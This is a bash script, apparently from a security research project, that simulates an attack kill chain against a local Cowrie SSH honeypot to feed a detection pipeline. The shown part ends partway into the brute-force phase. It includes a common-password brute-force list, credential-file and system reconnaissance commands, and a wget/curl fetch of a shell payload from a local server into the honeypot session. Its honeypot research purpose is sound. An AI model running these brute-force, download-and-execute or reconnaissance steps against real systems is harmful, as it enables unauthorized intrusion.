#!/bin/bash
# =============================================================================
# CyberSentinel AI — attack.sh
# Realistic multi-phase attack simulation against Cowrie SSH honeypot
#
# SIH26153 context:
#   This script simulates a real-world attacker kill chain against the Cowrie
#   honeypot running on port 2222. It generates REAL network traffic at both
#   the application layer (SSH commands recorded by Cowrie) AND the packet
#   layer (real TCP packets captured live via scapy_feature_extractor.py).
#
# What this is NOT:
#   - Not an attack against any real system
#   - Target is Cowrie honeypot running locally in Docker, on port 2222 —
#     connected via the container's real bridge IP (auto-resolved via docker
#     inspect at startup) rather than 127.0.0.1, so packet capture sees full
#     traffic instead of mostly missing it behind Docker's loopback/NAT path.
#     Falls back to 127.0.0.1 automatically if IP resolution fails.
#   - Payload server is a local Python HTTP server serving a harmless echo script
#   - All activity stays inside the local Docker bridge network
#
# MITRE ATT&CK techniques triggered:
#   T1110  — Brute Force            (Phase 2: credential stuffing, measured not assumed)
#   T1082  — System Info Discovery  (Phase 1: uname -a, cat /etc/issue)
#   T1087  — Account Discovery      (Phase 1: whoami, id, cat /etc/passwd)
#   T1105  — Ingress Tool Transfer  (Phase 3: wget payload from the "payload" container)
#   T1204  — User Execution         (Phase 3: chmod +x + execute payload)
#   T1049  — Network Connections    (Phase 4: netstat/ss)
#   T1057  — Process Discovery      (Phase 4: ps aux)
#   T1046  — Network Service Scanning     (Phase 5: nmap / TCP sweep)
#   T1548  — Abuse Elevation Control      (Phase 6: sudo -l, SUID hunting)
#   T1552  — Unsecured Credentials        (Phase 7: key/config/cred file search)
#   T1021  — Remote Services              (Phase 8: attempted lateral SSH)
#   T1070  — Indicator Removal            (Phase 9: history clearing, log tampering attempts)
#   T1499  — Endpoint Denial of Service   (Phase 10: rapid connection flood)
#   T1489  — Service Stop                 (Phase 11: attempted kill of security services)
#   T1078  — Valid Accounts               (Phase 12: clean re-entry with a known-good credential)
#   T1005  — Data from Local System       (Phase 13: tar up discovered creds/config)
#   T1041  — Exfiltration Over C2 Channel (Phase 13: curl POST the archive to the payload container)
#
# NOTE on ttp_extract.py: all 17 of the above are now recognized by
# ttp_extract.py's TECHNIQUE_RULES. Earlier versions of that registry only
# matched 5 techniques (T1059/T1082/T1087/T1105/T1110), so most phases below
# ran but were silently dropped before reaching ttp_records.json — if you're
# diffing technique counts against an old report, that's why they jump.
#
# Usage:
#   ./attack.sh                 — full simulation (all 13 phases + packet capture)
#   ./attack.sh --no-brute      — skip brute force phase (faster, for quick tests)
#   ./attack.sh --no-capture    — skip live packet capture (app-layer only)
#   ./attack.sh --phase 1       — run only one phase (1-13)
#   ./attack.sh --quiet         — suppress per-command output
#   ./attack.sh --shuffle-mid   — randomize the order of phases 4-9 (post-compromise
#                                 enum/scan/privesc/creds/lateral/indicator-removal).
#                                 Phases 1-3 (entry) and 10-13 (impact/persistence/
#                                 exfil) stay fixed. Use this across repeated runs
#                                 (see run_campaign.sh) so the LSTM sees genuinely
#                                 varied real kill-chain orderings instead of only
#                                 ever training on synthetic augmentation to get
#                                 sequence diversity.
#
# Overrides (env vars, optional):
#   PAYLOAD_SERVER_IP_OVERRIDE=<ip>    force the payload server's advertised IP/host
#                                       (default: try the "payload" compose service
#                                       first, then fall back to IP auto-detection)
#   CAPTURE_IFACE_OVERRIDE=<iface>     force the packet-capture interface
#   COWRIE_IP_OVERRIDE=<ip>            force the Cowrie SSH target IP (default:
#                                       auto-resolved container bridge IP, falling
#                                       back to 127.0.0.1 if that can't be found)
#   DOS_CONNECTIONS_TARGET=<n>         number of connections in Phase 10's flood (default 50)
#
# Prerequisites:
#   sudo apt install -y sshpass tcpdump
#   docker-compose up -d && sleep 15   (Cowrie + payload container must be running first)
#   scapy_feature_extractor.py present in this directory (for packet capture)
# =============================================================================

set -uo pipefail
# NOTE: 'set -e' was removed on purpose. The old script used it together with
# an invalid ${#USERS[@]:-0} substitution in the summary block, which caused
# the ENTIRE script — including the whole Phase 4 summary — to die silently
# partway through (see the "bad substitution" crash). Every risky command
# below is now checked explicitly instead of relying on -e to fail loud.

# ── Configuration ─────────────────────────────────────────────────────────────
HONEYPOT_IP="127.0.0.1"
HONEYPOT_PORT="2222"
PAYLOAD_SERVER_PORT="8000"
PAYLOAD_FILE="payload.sh"
PAYLOAD_DIR="./payload"          # bind-mounted into docker-compose's "payload" service
LOG_FILE="attacks.log"
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
PCAP_FILE="honeypot_capture_$(date +%Y%m%d_%H%M%S).pcap"

# Credential sets (declared globally — the old script defined USERS/PASSWORDS
# *inside* the Phase 2 block, so referencing them later in the summary crashed
# whenever Phase 2 was skipped or the script reached the end. Now global.)
USERS=("root" "admin" "test" "oracle" "mysql" "ubuntu" "pi" "user")
PASSWORDS=("password123" "admin123" "123456" "root" "toor" "pass" "letmein" "qwerty")
USERS_COUNT=${#USERS[@]}

# SSH options — disable host key checking (honeypot rotates keys)
SSH_OPTS="-p ${HONEYPOT_PORT} \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o PasswordAuthentication=yes \
  -o PubkeyAuthentication=no \
  -o BatchMode=no \
  -o ConnectTimeout=5 \
  -o LogLevel=ERROR"

# Argument parsing
SKIP_BRUTE=0
SKIP_CAPTURE=0
QUIET=0
ONLY_PHASE=""
SHUFFLE_MID=0
for arg in "$@"; do
  case $arg in
    --no-brute)     SKIP_BRUTE=1 ;;
    --no-capture)   SKIP_CAPTURE=1 ;;
    --quiet)        QUIET=1 ;;
    --phase)        shift; ONLY_PHASE="$1" ;;
    --shuffle-mid)  SHUFFLE_MID=1 ;;
  esac
done

# ── Helpers ───────────────────────────────────────────────────────────────────
log() {
  echo "[$(date '+%H:%M:%S')] $*" | tee -a "$LOG_FILE"
}

log_phase() {
  echo ""
  echo "┌──────────────────────────────────────────────────────────┐"
  printf  "│  %-56s│\n" "$*"
  echo "└──────────────────────────────────────────────────────────┘"
}

ssh_cmd() {
  local user="$1"
  local pass="$2"
  local cmds="$3"
  sshpass -p "$pass" ssh $SSH_OPTS "${user}@${HONEYPOT_IP}" \
    bash -s <<< "$cmds" 2>/dev/null
}

check_dependencies() {
  local missing=0
  for cmd in sshpass ssh; do
    if ! command -v "$cmd" &>/dev/null; then
      echo "[!] Missing dependency: $cmd"
      echo "    Install: sudo apt install -y $cmd"
      missing=1
    fi
  done
  if [ $missing -eq 1 ]; then
    exit 1
  fi
}

check_honeypot() {
  log "Checking Cowrie honeypot on ${HONEYPOT_IP}:${HONEYPOT_PORT}..."
  if ! nc -z -w3 "$HONEYPOT_IP" "$HONEYPOT_PORT" 2>/dev/null; then
    echo "[!] Cowrie not reachable at ${HONEYPOT_IP}:${HONEYPOT_PORT}"
    echo "    Run: docker-compose up -d && sleep 15"
    exit 1
  fi
  log "Cowrie is UP and accepting connections ✓"
}

# =============================================================================
# ANSWERS Q1 — "Is this real traffic or just SSH commands?"
#
# The app-layer commands (whoami, wget, etc.) are recorded by Cowrie itself.
# That alone only proves *application-layer* activity. To prove real traffic
# exists at the *packet* layer too, this script now drives
# scapy_feature_extractor.py automatically, sniffing real TCP packets on the
# Docker bridge that carries traffic to the honeypot, for the full duration
# of the run. Output: honeypot_capture_<timestamp>.pcap — openable in
# Wireshark, and directly consumable by your Phase-2 feature pipeline.
# =============================================================================
detect_cowrie_container() {
  docker ps --format '{{.Names}}' 2>/dev/null | grep -i cowrie | head -n1
}

detect_cowrie_network_id() {
  local container
  container=$(detect_cowrie_container)
  [ -z "$container" ] && return 1
  docker inspect "$container" \
    --format '{{range $k, $v := .NetworkSettings.Networks}}{{$v.NetworkID}}{{end}}' 2>/dev/null
}

detect_cowrie_ip() {
  # Cowrie's real container bridge IP, resolved via docker inspect the same
  # reliable way detect_cowrie_network_id() resolves the capture interface —
  # not guessed, and NOT hardcoded, because this IP changes across
  # docker-compose restarts.
  #
  # Why connect here instead of 127.0.0.1: traffic to a published port via
  # 127.0.0.1 goes through Docker's userland-proxy/hairpin-NAT path, which a
  # plain bridge-interface packet capture mostly misses — confirmed directly
  # in testing: one full SSH session via the container's direct IP produced
  # a clean, complete capture (~32 packets), while the SAME kind of session
  # via 127.0.0.1 was producing under ~1 packet captured per session across
  # a full attack run. SSH itself works identically either way — this only
  # changes which interface the traffic actually traverses, which is what
  # makes the packet-level features genuinely measured instead of mostly
  # falling back to the Cowrie-JSON proxy path.
  local container
  container=$(detect_cowrie_container)
  [ -z "$container" ] && return 1
  docker inspect "$container" \
    --format '{{range $k, $v := .NetworkSettings.Networks}}{{$v.IPAddress}}{{end}}' 2>/dev/null
}

detect_capture_interface() {
  # Ask Docker which network the Cowrie container is actually on, then map
  # that to its host-side bridge name (Docker names it "br-" + first 12
  # chars of the network ID — this is exact, not a guess). Falls back to
  # scanning for any custom bridge only if the container can't be found,
  # which matters when the host has more than one docker-compose network
  # and a naive "last br- interface" pick grabs the wrong one.
  local net_id iface
  net_id=$(detect_cowrie_network_id)
  if [ -n "$net_id" ]; then
    iface="br-${net_id:0:12}"
    if ip link show "$iface" &>/dev/null; then
      echo "$iface"
      return
    fi
  fi
  iface=$(ip -o link show 2>/dev/null | awk -F': ' '/br-/{print $2}' | tail -n1)
  if [ -z "$iface" ]; then
    iface="docker0"
  fi
  echo "$iface"
}

start_packet_capture() {
  CAPTURE_PID=0
  if [ "$SKIP_CAPTURE" -eq 1 ]; then
    log "Packet capture skipped (--no-capture) — app-layer logs only"
    return
  fi
  if [ ! -f "scapy_feature_extractor.py" ]; then
    log "[!] scapy_feature_extractor.py not found in $(pwd) — skipping automated packet capture"
    log "    Run it manually in another terminal instead:"
    log "      sudo python3 scapy_feature_extractor.py --capture --iface <bridge> --port ${HONEYPOT_PORT}"
    return
  fi

  CAPTURE_IFACE="${CAPTURE_IFACE_OVERRIDE:-$(detect_capture_interface)}"
  log "Starting live packet capture on interface ${CAPTURE_IFACE} (tcp port ${HONEYPOT_PORT})"
  log "  → resolved via docker inspect on the Cowrie container's network, not guessed"
  log "  → proves attack traffic at the packet layer, not just inside Cowrie's app log"

  # Cache sudo credentials up front so the backgrounded capture doesn't hang
  # waiting on an interactive password prompt.
  sudo -v
  if [ $? -ne 0 ]; then
    log "[!] Could not obtain sudo — packet capture skipped"
    return
  fi

  # --pcap is explicit here on purpose: without it, scapy_feature_extractor.py
  # falls back to its own hardcoded default ("honeypot_capture.pcap") instead
  # of this run's timestamped $PCAP_FILE. That meant every run's "fresh"
  # capture was actually silently aliasing onto the SAME fixed filename —
  # and combined with the kill-signal issue documented in
  # stop_packet_capture() below, that stale file was never being overwritten
  # at all, so every run was unknowingly re-reporting a capture from days
  # earlier (confirmed: its mtime never changed across a full attack1.sh run).
  # -u = unbuffered stdout/stderr. Without it, Python block-buffers output
  # when stdout isn't a TTY (as it isn't here, redirected to a log file), so
  # even this process's own startup message sits in an internal buffer and
  # never reaches /tmp/cs_capture.log until the process exits cleanly — which
  # is exactly the failure mode we're chasing, so an empty log so far has
  # told us nothing. This makes every print show up immediately.
  sudo python3 -u scapy_feature_extractor.py --capture \
    --iface "$CAPTURE_IFACE" --port "$HONEYPOT_PORT" --pcap "$PCAP_FILE" \
    > /tmp/cs_capture.log 2>&1 &
  CAPTURE_PID=$!
  sleep 2

  if kill -0 "$CAPTURE_PID" 2>/dev/null; then
    log "Packet capture running (PID ${CAPTURE_PID}) ✓ → ${PCAP_FILE}"
  else
    log "[!] Packet capture failed to start — /tmp/cs_capture.log contents:"
    if [ -f /tmp/cs_capture.log ]; then
      while IFS= read -r line; do log "    ${line}"; done < <(tail -n 15 /tmp/cs_capture.log)
    else
      log "    (log file does not exist)"
    fi
    CAPTURE_PID=0
  fi
}

stop_packet_capture() {
  if [ "${CAPTURE_PID:-0}" -gt 0 ]; then
    # Plain `sudo kill -INT "$CAPTURE_PID"` is NOT reliable here: on Kali's
    # default sudo config, `sudo cmd &` can fork a separate monitor process,
    # so $! (captured as CAPTURE_PID) doesn't always point at the actual
    # python/scapy process doing the sniffing. When that happens, the signal
    # lands on nothing that matters, scapy's sniff() loop never returns, and
    # its one-shot wrpcap() write never happens — the capture process just
    # hangs in the background indefinitely, and $PCAP_FILE is never created.
    # (This is exactly what was happening: confirmed by honeypot_capture.pcap
    # sitting at an unchanged mtime across an entire attack1.sh run.)
    # pkill -f matches by command line instead of PID, so it reaches the
    # real process regardless of how sudo forked it. Send both, belt-and-
    # braces, then give wrpcap() a moment to flush a potentially large
    # packet list to disk.
    sudo pkill -INT -f "scapy_feature_extractor.py --capture" 2>/dev/null
    sudo kill -INT "$CAPTURE_PID" 2>/dev/null
    sleep 3

    if [ -f "$PCAP_FILE" ]; then
      local size
      size=$(du -h "$PCAP_FILE" 2>/dev/null | cut -f1)
      log "Packet capture stopped — ${PCAP_FILE} (${size:-unknown size})"
      # Point the stable name at THIS run's capture. The documented extract
      # step (`--extract --pcap honeypot_capture.pcap`) reads that stable name;
      # without this it would read a leftover pcap from a DIFFERENT run, so its
      # wire src_ports would never match this run's Cowrie log — which is
      # exactly the "0/155 matched, sample ports look completely different"
      # symptom. Copying only on success (PCAP_FILE exists) means the stable
      # name always reflects the most recent GOOD run, never a stale leftover.
      cp -f "$PCAP_FILE" honeypot_capture.pcap 2>/dev/null \
        && log "  → also copied to honeypot_capture.pcap (this run is now the one --extract will use)"
    else
      # $PCAP_FILE should always exist at this point now that --pcap is
      # passed explicitly in start_packet_capture(). If it doesn't, the
      # capture process genuinely never wrote it (still hung, crashed, or
      # never started) — say so loudly rather than silently substituting
      # some OTHER honeypot_capture*.pcap file, which would just be a stale
      # leftover from an earlier run and would silently corrupt this run's
      # packet-level numbers the same way the old fallback logic did.
      log "[!] Expected capture file ${PCAP_FILE} was NOT created."
      log "    This means the capture process did not exit cleanly — do NOT"
      log "    trust any other honeypot_capture*.pcap file as this run's data."
      log "    Check for an orphaned process: ps aux | grep scapy_feature_extractor"
      if [ -f /tmp/cs_capture.log ]; then
        log "  Contents of /tmp/cs_capture.log:"
        while IFS= read -r line; do log "    ${line}"; done < <(tail -n 15 /tmp/cs_capture.log)
      else
        log "  /tmp/cs_capture.log does not exist either — capture likely never started"
      fi
    fi
  fi
}

# =============================================================================
# ANSWERS Q2 — "Why is the payload server at 10.0.2.2:8000 — is that a real
# attacker?"
#
# It's not, and it never claimed to be — it's a local Python HTTP server
# playing the role of attacker infrastructure, same idea as Metasploit's
# LHOST in a lab exercise. The bug in the OLD script was that 10.0.2.2 is a
# VirtualBox NAT convention that only applies when Cowrie runs directly on a
# VM with that specific network mode. Your Cowrie runs inside a Docker
# container instead, so the container can only reach the host via the Docker
# bridge gateway (e.g. 172.18.0.1) — not 10.0.2.2. That's exactly why Phase 3
# was failing with "unable to resolve host address '10.0.2.2'".
#
# Fix: auto-detect the real bridge gateway IP, and verify reachability FROM
# INSIDE the honeypot session before running the full Phase 3 loop, instead
# of discovering the failure 10 times over.
# =============================================================================
detect_payload_server_ip() {
  # PRIMARY method: ask the Cowrie container's own kernel what its default
  # gateway actually is, by reading /proc/net/route from inside the
  # container via `docker exec`. This is the exact route the container will
  # use for any outbound request — not a guess based on scanning host-side
  # bridges, which failed twice in a row on this host (multiple docker
  # networks made that approach unreliable).
  local container route_line gw_hex ip
  container=$(detect_cowrie_container)
  if [ -n "$container" ]; then
    route_line=$(docker exec "$container" cat /proc/net/route 2>/dev/null | awk '$2=="00000000"{print;exit}')
    if [ -n "$route_line" ]; then
      gw_hex=$(echo "$route_line" | awk '{print $3}')
      if [ -n "$gw_hex" ] && [ "${#gw_hex}" -eq 8 ]; then
        ip=$(( 16#${gw_hex:6:2} )).$(( 16#${gw_hex:4:2} )).$(( 16#${gw_hex:2:2} )).$(( 16#${gw_hex:0:2} ))
        echo "$ip"
        return
      fi
    fi
  fi

  # Fallback tier 2: docker inspect gateway on the container's network
  local net_id
  net_id=$(detect_cowrie_network_id)
  if [ -n "$net_id" ]; then
    ip=$(docker network inspect "$net_id" \
      --format '{{range .IPAM.Config}}{{.Gateway}}{{end}}' 2>/dev/null)
    [ -n "$ip" ] && { echo "$ip"; return; }
  fi

  # Fallback tier 3: scan host bridges (least reliable — kept for last resort)
  ip=$(ip -o -4 addr show 2>/dev/null | awk '/br-/{print $4}' | cut -d/ -f1 | head -n1)
  if [ -z "$ip" ]; then
    ip=$(ip -o -4 addr show docker0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
  fi
  echo "${ip:-10.0.2.2}"
}

detect_compose_payload_container() {
  docker ps --format '{{.Names}}' 2>/dev/null | grep -i 'payload' | head -n1
}

# Resolve the payload container's REAL network IP (not the "payload" DNS name).
# This is the finding #6 fix: Cowrie's built-in wget/curl download feature uses
# Twisted's own DNS resolver, which does not reliably query Docker's embedded
# DNS server (127.0.0.11), so the hostname "payload" fails to resolve from
# inside a Cowrie session even though the container is right there on the same
# network. A raw IP needs no DNS at all, so passing the payload container's IP
# is what actually makes Phase 3 reachable. Prints nothing on failure so the
# caller can fall back to the DNS name.
detect_payload_container_ip() {
  local cname="$1"
  [ -z "$cname" ] && return 0
  docker inspect "$cname" \
    --format '{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}' 2>/dev/null \
    | tr ' ' '\n' | grep -E '^[0-9]+\.' | head -n1
}

setup_payload_server() {
  local cowrie_container net_id detected_ip route_line compose_payload

  # Always (re)write the payload file into PAYLOAD_DIR. Whether that
  # directory is served by our own self-hosted http.server below, or by
  # the docker-compose "payload" container (bind-mounted to the same
  # path), the file just needs to exist on disk before Phase 3 runs.
  mkdir -p "$PAYLOAD_DIR"
  cat > "${PAYLOAD_DIR}/${PAYLOAD_FILE}" << 'PAYLOAD'
#!/bin/bash
# CyberSentinel AI — harmless test payload
# This file proves T1105 (Ingress Tool Transfer) and T1204 (User Execution)
# It performs no harmful action — it only identifies itself
echo "[payload] CyberSentinel test payload executed"
echo "[payload] hostname: $(hostname 2>/dev/null || echo 'cowrie-honeypot')"
echo "[payload] whoami:   $(whoami 2>/dev/null || echo 'root')"
echo "[payload] T1204 User Execution — confirmed"
PAYLOAD
  chmod +x "${PAYLOAD_DIR}/${PAYLOAD_FILE}"

  # PRIMARY path: is docker-compose's "payload" service already running?
  # If so it's already serving PAYLOAD_DIR on the same compose network as
  # Cowrie, reachable by Docker's built-in DNS at the hostname "payload" —
  # no IP guessing, no host-firewall/bridge-routing dependency at all. This
  # is what was actually breaking Phase 3 before: 172.18.0.1/172.17.0.1 are
  # host bridge-gateway IPs, and reaching them from inside a container
  # depends on the host's iptables/firewall state, which varies by machine.
  # Container-to-container DNS on a user-defined bridge network does not.
  compose_payload=$(detect_compose_payload_container)
  if [ -n "$compose_payload" ]; then
    log "[debug] docker-compose 'payload' service detected (${compose_payload}) — using it instead of a self-hosted server"
    # Cowrie's real-download feature uses Twisted's own DNS client (not glibc's
    # resolver), which has known compatibility gaps with Docker's embedded DNS
    # (127.0.0.11) — confirmed via a direct wget test inside a live session:
    # resolv.conf is correct and `docker exec` resolves "payload" fine, but
    # Cowrie's own wget fails with "Temporary failure in name resolution".
    # So we now auto-resolve the payload container's REAL IP (finding #6 fix)
    # and use that — a raw IP needs no DNS. Only fall back to the "payload"
    # DNS name if the inspect fails, and always let an explicit override win.
    local resolved_payload_ip
    resolved_payload_ip=$(detect_payload_container_ip "$compose_payload")
    if [ -n "${PAYLOAD_SERVER_IP_OVERRIDE:-}" ]; then
      PAYLOAD_SERVER_IP="$PAYLOAD_SERVER_IP_OVERRIDE"
      log "[debug] Using PAYLOAD_SERVER_IP_OVERRIDE=${PAYLOAD_SERVER_IP} for the payload container"
    elif [ -n "$resolved_payload_ip" ]; then
      PAYLOAD_SERVER_IP="$resolved_payload_ip"
      log "[debug] Resolved payload container IP to ${PAYLOAD_SERVER_IP} via docker inspect — using the raw IP so Cowrie's DNS-less wget can reach it"
    else
      PAYLOAD_SERVER_IP="payload"
      log "[debug] Could not resolve the payload container IP — falling back to the 'payload' DNS name (may fail from inside Cowrie; set PAYLOAD_SERVER_IP_OVERRIDE=<ip> if Phase 3 is skipped)"
    fi
    PAYLOAD_PID=-1                # sentinel: externally managed, cleanup_payload_server() must not kill it
    log "Payload will be served by the 'payload' container (${compose_payload}) at http://${PAYLOAD_SERVER_IP}:${PAYLOAD_SERVER_PORT}/${PAYLOAD_FILE}"
    return
  fi

  # FALLBACK path: no compose "payload" service running (e.g. docker-compose.yml
  # wasn't updated, or Cowrie was started some other way) — fall back to the
  # original self-hosted-server + IP-guessing approach so the script still
  # works, just with the same reachability caveats as before.
  log "[debug] No docker-compose 'payload' service found — falling back to self-hosted server + IP detection"
  cowrie_container=$(detect_cowrie_container)
  net_id=""
  detected_ip=""

  if [ -z "$cowrie_container" ]; then
    log "[debug] No running container name matched 'cowrie' via 'docker ps' — is docker on PATH / do you have permission to run it without sudo?"
  else
    log "[debug] Cowrie container detected: ${cowrie_container}"
    route_line=$(docker exec "$cowrie_container" cat /proc/net/route 2>/dev/null | awk '$2=="00000000"{print;exit}')
    if [ -n "$route_line" ]; then
      log "[debug] Container's own default route (/proc/net/route): ${route_line}"
    else
      log "[debug] 'docker exec ${cowrie_container} cat /proc/net/route' returned nothing — falling back to docker network inspect"
      net_id=$(detect_cowrie_network_id)
      [ -n "$net_id" ] && log "[debug] Cowrie container network ID: ${net_id}"
    fi
  fi

  PAYLOAD_SERVER_IP="${PAYLOAD_SERVER_IP_OVERRIDE:-$(detect_payload_server_ip)}"
  log "[debug] Final resolved payload IP before probing: ${PAYLOAD_SERVER_IP}"
  if [ -n "$cowrie_container" ] && [ -z "${PAYLOAD_SERVER_IP_OVERRIDE:-}" ]; then
    log "Payload server IP resolved to ${PAYLOAD_SERVER_IP} (Cowrie container's own default-route gateway — NOT a real attacker host). This will still be re-verified by a live probe before Phase 3 runs."
  else
    log "Payload server IP resolved to ${PAYLOAD_SERVER_IP} (FALLBACK detection, not container-verified — override with PAYLOAD_SERVER_IP_OVERRIDE if Phase 3 fails)"
  fi

  pkill -f "python3 -m http.server ${PAYLOAD_SERVER_PORT}" 2>/dev/null
  sleep 1

  (cd "$PAYLOAD_DIR" && python3 -m http.server "$PAYLOAD_SERVER_PORT" \
    --bind 0.0.0.0 > /tmp/payload_server.log 2>&1) &
  PAYLOAD_PID=$!

  sleep 2

  if kill -0 "$PAYLOAD_PID" 2>/dev/null; then
    log "Payload HTTP server started on 0.0.0.0:${PAYLOAD_SERVER_PORT} (PID ${PAYLOAD_PID}) ✓"
    log "Payload URL: http://${PAYLOAD_SERVER_IP}:${PAYLOAD_SERVER_PORT}/${PAYLOAD_FILE}"
  else
    log "[!] Payload server failed to start — Phase 3 will be skipped"
    PAYLOAD_PID=0
  fi
}

verify_payload_reachable() {
  # Tests reachability from INSIDE the honeypot's own shell session — the
  # only place that actually matters for Phase 3 — instead of assuming it.
  #
  # Rather than trusting a single guessed IP, this now collects every
  # plausible candidate (the Cowrie container's own network gateway if
  # docker inspect worked, PLUS every other br-/docker0 gateway visible on
  # the host) and tests each one for real from inside the session, keeping
  # whichever one actually answers. This sidesteps needing to get the
  # detection logic perfectly right on hosts with multiple docker networks.
  if [ "${PAYLOAD_PID:-0}" -eq 0 ]; then
    return 1
  fi

  local candidates=()
  # PAYLOAD_SERVER_IP goes FIRST — in the compose path it's now the payload
  # container's real IP (finding #6 fix), which needs no DNS and is what
  # actually works from inside Cowrie's DNS-less wget. The "payload" compose
  # DNS name is added only as a later fallback (it resolves fine via `docker
  # exec` but often not via Cowrie's Twisted resolver), so we try the reliable
  # raw IP before spending a probe on the name that usually fails.
  [ -n "$PAYLOAD_SERVER_IP" ] && candidates+=("$PAYLOAD_SERVER_IP")
  if [ "${PAYLOAD_PID}" -eq -1 ] && [ "$PAYLOAD_SERVER_IP" != "payload" ]; then
    candidates+=("payload")
  fi
  while IFS= read -r ip; do
    [ -n "$ip" ] && candidates+=("$ip")
  done < <(ip -o -4 addr show 2>/dev/null | awk '/br-|docker0/{print $4}' | cut -d/ -f1)

  # de-duplicate while preserving order
  local seen="" unique=()
  for ip in "${candidates[@]}"; do
    case " $seen " in
      *" $ip "*) ;;
      *) unique+=("$ip"); seen="$seen $ip" ;;
    esac
  done

  log "Probing ${#unique[@]} candidate payload-server IP(s) from inside the honeypot session: ${unique[*]}"

  local ip result
  for ip in "${unique[@]}"; do
    # Content-based reachability check, not exit-code based. Cowrie's wget/curl
    # are EMULATED: they don't reliably support flags like -q/--timeout/-O and
    # their exit codes don't always mirror real wget, so `wget … && echo OK`
    # gave false negatives even when the fetch would have worked. Instead we
    # fetch with bare wget AND bare curl (whichever Cowrie's emulation honours),
    # then look for the payload's own marker string in what actually landed in
    # the session — that's true reachability, independent of emulator quirks.
    result=$(ssh_cmd "root" "password123" "
rm -f ${PAYLOAD_FILE} 2>/dev/null
wget http://${ip}:${PAYLOAD_SERVER_PORT}/${PAYLOAD_FILE} 2>&1
curl -s -o ${PAYLOAD_FILE} http://${ip}:${PAYLOAD_SERVER_PORT}/${PAYLOAD_FILE} 2>&1
cat ${PAYLOAD_FILE} 2>/dev/null
exit
")
    if echo "$result" | grep -q "CyberSentinel"; then
      PAYLOAD_SERVER_IP="$ip"
      log "Payload server reachable from honeypot session ✓ at ${PAYLOAD_SERVER_IP} (confirmed by fetching the payload content, not just an exit code)"
      return 0
    fi
    log "  [x] ${ip} — unreachable"
  done

  log "[!] None of the ${#unique[@]} candidate IPs served the payload to the honeypot session"
  log "    One command tells you whether this is a NETWORK problem or a Cowrie"
  log "    wget-emulation limit. Run, on the Kali host:"
  log "      docker exec \$(docker ps --format '{{.Names}}' | grep cowrie | head -1) wget -O- http://${PAYLOAD_SERVER_IP}:${PAYLOAD_SERVER_PORT}/${PAYLOAD_FILE}"
  log "    • Payload text prints → the container network is fine; Cowrie's own"
  log "      emulated wget just won't fetch it (a Cowrie limitation, not this"
  log "      pipeline). T1105/T1204 are still detected from other command"
  log "      patterns — the run's report already flags them — so this only"
  log "      affects the live file-transfer demo, not detection."
  log "    • Nothing / an error → real network issue: check the payload"
  log "      container is up (docker ps | grep payload) and retry with"
  log "      PAYLOAD_SERVER_IP_OVERRIDE=<ip> ./attack1.sh"
  log "    Phase 3 is SKIPPED this run rather than looping on a known failure."
  return 1
}

cleanup_payload_server() {
  # PAYLOAD_PID == -1 means the docker-compose "payload" service is serving
  # this — it's a persistent container meant to outlive this script run
  # (other attack1.sh invocations, and Phase 13's exfil uploads, need it to
  # keep running), so don't touch it here.
  if [ "${PAYLOAD_PID:-0}" -gt 0 ]; then
    kill "$PAYLOAD_PID" 2>/dev/null
    log "Payload server stopped (PID ${PAYLOAD_PID})"
  fi
}

# ── Main ──────────────────────────────────────────────────────────────────────
trap 'cleanup_payload_server; stop_packet_capture' EXIT

# Resolve Cowrie's real container IP for the SSH target — see
# detect_cowrie_ip()'s comment above for why this matters for packet
# capture, not just connectivity. Falls back to the original 127.0.0.1
# loopback path if detection fails for any reason, so the script still
# runs (just with degraded capture fidelity) rather than breaking outright.
_resolved_cowrie_ip=$(detect_cowrie_ip)
HONEYPOT_IP="${COWRIE_IP_OVERRIDE:-${_resolved_cowrie_ip:-$HONEYPOT_IP}}"
if [ "$HONEYPOT_IP" = "127.0.0.1" ]; then
  log "[debug] Could not resolve Cowrie's container IP — falling back to 127.0.0.1 (packet capture will likely under-count; app-layer logging is unaffected)"
else
  log "[debug] Connecting via Cowrie's direct container IP (${HONEYPOT_IP}) instead of 127.0.0.1 — this is what lets the packet capture see full traffic instead of just the loopback/NAT remnant"
fi

log "================================================================"
log "  CyberSentinel AI — Attack Simulation"
log "  Target: Cowrie honeypot at ${HONEYPOT_IP}:${HONEYPOT_PORT}"
log "  Started: ${TIMESTAMP}"
log "================================================================"
log ""

check_dependencies
check_honeypot
start_packet_capture
setup_payload_server

# Track counters for end-of-run summary
RECON_SESSIONS=0
BRUTE_ATTEMPTS=0
FAILED_LOGINS=0
SUCCESS_LOGINS=0
DISTINCT_USERNAMES=0
EXEC_SESSIONS=0
PHASE3_RAN=0
SCAN_SESSIONS=0
PRIVESC_SESSIONS=0
CREDS_SESSIONS=0
LATERAL_ATTEMPTS=0
INDICATOR_SESSIONS=0
DOS_CONNECTIONS=0
SERVICE_STOP_SESSIONS=0
PERSIST_SESSIONS=0
EXFIL_SESSIONS=0

# =============================================================================
# PHASE 1 — RECONNAISSANCE
# MITRE T1082: System Information Discovery
# MITRE T1087: Account Discovery
# =============================================================================
if [ -z "$ONLY_PHASE" ] || [ "$ONLY_PHASE" = "1" ]; then

log_phase "Phase 1: Reconnaissance  [T1082 · T1087]"
log "Running system enumeration commands (10 sessions)"
log "Triggers: T1082 (uname, /etc/issue) · T1087 (whoami, id, /etc/passwd)"

for i in {1..10}; do
  ssh_cmd "root" "password123" '
whoami
id
uname -a
cat /etc/issue 2>/dev/null || echo "no /etc/issue"
cat /etc/passwd
hostname
env
ls /home
ls /root 2>/dev/null || true
exit
' >/dev/null
  RECON_SESSIONS=$((RECON_SESSIONS + 1))
  [ "$QUIET" -eq 0 ] && printf "  [Recon] Session %2d/10 complete\r" "$i"
  sleep 0.3
done
echo ""
log "Phase 1 complete: ${RECON_SESSIONS} reconnaissance sessions ✓"
log "  → T1082 (System Info Discovery) triggered: uname -a, /etc/issue"
log "  → T1087 (Account Discovery) triggered: whoami, id, cat /etc/passwd"

fi # end Phase 1

# =============================================================================
# PHASE 2 — BRUTE FORCE
# MITRE T1110: Brute Force
#
# ANSWERS Q3 — "How do you know T1110 is actually brute force and not just
# failed logins?"
#
# The OLD script only counted total attempts and printed the *configured*
# username count — it never checked whether individual logins actually
# failed. This version checks the real exit code of every single SSH
# attempt, tallies real failures vs. real successes, counts distinct
# usernames actually used, and prints a validation block comparing those
# measured numbers against ttp_extract.py's own T1110 threshold (≥5 failed
